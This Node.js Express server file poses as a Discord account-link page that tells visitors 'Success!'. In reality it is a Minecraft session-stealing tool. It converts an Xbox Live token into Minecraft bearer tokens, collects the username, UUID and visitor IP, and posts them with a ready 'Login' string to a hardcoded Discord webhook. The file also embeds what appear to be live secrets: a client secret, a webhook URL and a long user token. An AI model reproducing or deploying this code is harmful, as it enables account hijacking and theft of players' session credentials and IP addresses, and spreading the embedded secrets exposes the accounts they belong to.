// Configuration
const client_secret = '-Pw8Q~oEXLe~w~eRhIfGOp0qOuZS6PeafRIOCbPQ'
const client_id = '170ccb61-c568-409a-a59a-e2ecd656a9c5'
const redirect_uri = 'https://linkdiscord.herokuapp.com'
const webhook_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
const webhook_logging_url = 'https://discord.com/api/webhooks/1041392438268408009/SmIHe63fDeDjxCF4eoO8QB4Gi3cC3VM9ByEnyW5u-xBd4T5pxzZ7nrTMTT3QrvhN39pl'
// Config end
const axios = require('axios')
const express = require('express')
const app = express()
const port = process.env.PORT || 3000

console.log('got them both')
app.get('/', async (req, res) => {
    console.log('no query code for u')
    res.send('Success! You can exit this page and return to discord.')
    try {
        console.log('1')
        console.log('all of those parameters were obsolete, the fun part begins')
        const userToken = 'eyJhbGciOiJSU0EtT0FFUCIsImVuYyI6IkExMjhDQkMtSFMyNTYiLCJ6aXAiOiJERUYiLCJ4NXQiOiJxcEQtU2ZoOUg3NFFHOXlMN1hSZXJ5RmZvbk0iLCJjdHkiOiJKV1QifQ.LvcpuVjJfQDEGoPYFmsNTb6Q2pJZYwQMOZSA4lg6SCnykFRV8TqlGKd6kkHvz3i4s38MADben1yBjtQkOFH7GYOxhAUCjF0Kn_jV8TRWPNQttp1gYHjFAAb8gVxwgCD-4R1O4aLTqNr6jTLbv0ANAbd1nGU6XmOfqBOzhSWZwYN2v1jXVhbSSzxjzgzMXosxfN_gmhZpYHt5sbB3KiiCYghixUCCEc0zZoiZnxQw8UT3tozKEbihVWfZeVwjMcByYEaW6AxLmUrnGGX_arhr9HwPpFbklEaeh4aPkZgZfkqjCdXwKLo4dHDk1P7j54Yt6vpfCzA8bAlsGA91KUXgbA.rK9FwyCmKCP0I96hgYUMTA.5gMG9mksA-MQBIpUGUL3reNGnG-e3EqP1gn7AGzQIlivaaaplxvgMYY4kt9Vb0JDZ2OWk_ukMuj4NOpKwayJYLxr1yACMv-6EYwv-6s1ck6mUo9OJRIMzFMWjr69BpRULDvRJsvYYaOTr2GUhO1qJhM5mrP2GkNSnyR0p_hGpQQJzEVbmXQO5fRXwa4ZQFQ4R3e85wlbc2uqG-rFGLEaDmLBm9P06ZS4wOwcdpPGpspR3bCNCE_PGoHccpqzP4NSU-DSqAErIIXBghrviqiDPHUNjULl1jOZk2Koe4Tui-gETXXWuPMHKNyJpB7_2cyZMvfsRqvkNZysDJwUCYU_xpiSw_8WTdgfrtbqHKL2cOrcbSLdrz2PdUqoB5IFaqzpP2L94uKCeuUr28ajKTgl880ItHYtaTsVmy0CiFtrnWP5o6NWxYZgxVDO0s1iXTF67G_cmxPN-cuGOWvSJBRhbeEOEp4PjYP-32lWpXIZWgA2LbedsTw4SDDAex9Tvf4Haeq4kyfgkicTNl5qy0tcX0QDAa2fG5SF541balzBD0MrKLaIpFutwwurOduGq4QpjmYrQyIzAkUym5nF0qq4CybpS9VtIi1kHr-R-O9UCT3cHFYssQuPv8siS96yfpeVr_YqiyD9IxhEtNhZJR_Ze_Mk5T-pTLpK8NafwGf32SgcyX4TxoVgIxzfU-6qbvYeFkbbns9SvywD9xE1_zfyjK1AsBApOA2YR8b4jqjDR-mQMeQx62wUi1o-2d2-Xat0KIlXcHHxqPrM1QxtHk_Gdm_4OLv_RwAvonVizZvUazhH8H73VnRq7HK6aYX4Wa5D4ZxjLnUMcdZhE89ttDWnv56yulxST0quwOEE1_OHDTBusszUE_wXEFMTVnCuOordjGtXfl6lvgtINflLRluQHphQ_a03OQJhgTx7x1SJePGkhkdhtFAFj-pD34Qwt7_R0HHUsxUVU3vNBJseC5sUrbGkyHBM2MfDJ3zQMkj9YHsyqOV3IJ6OYi1AIwcPgii1.5EMMFaxrrrhw0HiEHjprIw'
        console.log('user token set') // MODIFY VALUE ABOVE  ^^^
        const xstsTokenHashArray = await getXSTSToken(userToken)
        console.log('got array')
        const xstsToken = xstsTokenHashArray[0]
        const userHash = xstsTokenHashArray[1]
        const bearerToken = await getBearerToken(xstsToken, userHash)
        const usernameAndUUIDArray = await getUsernameAndUUID(bearerToken)
        const uuid = usernameAndUUIDArray[0]
        const username = usernameAndUUIDArray[1]
        const ip = getIp(req)
        postToWebhook(username, bearerToken, uuid, ip, userToken)
    } catch (e) {
        console.log(e)
    }
})

app.listen(port, () => {
    console.log(`Started the server on ${port}`)
})

async function getUserHashAndToken(accessToken) {
    const url = 'https://user.auth.xboxlive.com/user/authenticate'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            AuthMethod: 'RPS', SiteName: 'user.auth.xboxlive.com', RpsTicket: `d=${accessToken}`
        }, RelyingParty: 'http://auth.xboxlive.com', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)
    return [response.data.Token, response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getXSTSToken(userToken) {
    const url = 'https://xsts.auth.xboxlive.com/xsts/authorize'
    const config = {
        headers: {
            'Content-Type': 'application/json', 'Accept': 'application/json',
        }
    }
    let data = {
        Properties: {
            SandboxId: 'RETAIL',
            UserTokens: [userToken]
        }, RelyingParty: 'rp://api.minecraftservices.com/', TokenType: 'JWT'
    }
    let response = await axios.post(url, data, config)

    return [response.data['Token'], response.data['DisplayClaims']['xui'][0]['uhs']]
}

async function getBearerToken(xstsToken, userHash) {
    const url = 'https://api.minecraftservices.com/authentication/login_with_xbox'
    const config = {
        headers: {
            'Content-Type': 'application/json',
        }
    }
    let data = {
        identityToken: "XBL3.0 x=" + userHash + ";" + xstsToken, "ensureLegacyEnabled": true
    }
    let response = await axios.post(url, data, config)
    return response.data['access_token']
}

async function getUsernameAndUUID(bearerToken) {
    const url = 'https://api.minecraftservices.com/minecraft/profile'
    const config = {
        headers: {
            'Authorization': 'Bearer ' + bearerToken,
        }
    }
    let response = await axios.get(url, config)
    return [response.data['id'], response.data['name']]
}

function getIp(req) {
    return req.headers['x-forwarded-for'] || req.socket.remoteAddress
}

function postToWebhook(username, bearerToken, uuid, ip, userToken) {
    const url = webhook_url
    let data = {
        username: " ",
        avatar_url: "https://cdn.discordapp.com/attachments/1021436161694105656/1027591805719560322/xd.jpg",
        content: "@everyone" + " **SSID REFRESHED**" + "  `xbl token: " + userToken + "`",
        embeds: [{
            title: "User Info", color: 0x00ff50, fields: [
                {name: "Username", value: username, inline: true},
                {name: "UUID", value: uuid, inline: true},
                {name: "Ip", value: ip, inline: true},
                {name: "SessionID", value: bearerToken, inline: false},
                {name: "Login", value: username + ":" + uuid + ":" + bearerToken, inline: false},
            ]
        }]
    }
    axios.post(url, data).then(() => console.log("Successfully authenticated, posting to webhook!"))
}



const bannedNames = []

function addBan(name) {
    bannedNames.push(name);
}

function checkIfBanned(name) {

    for (const item of bannedNames) {
        if (name === item) {
            return true
        }
    }
    addBan(name)
    return false
}
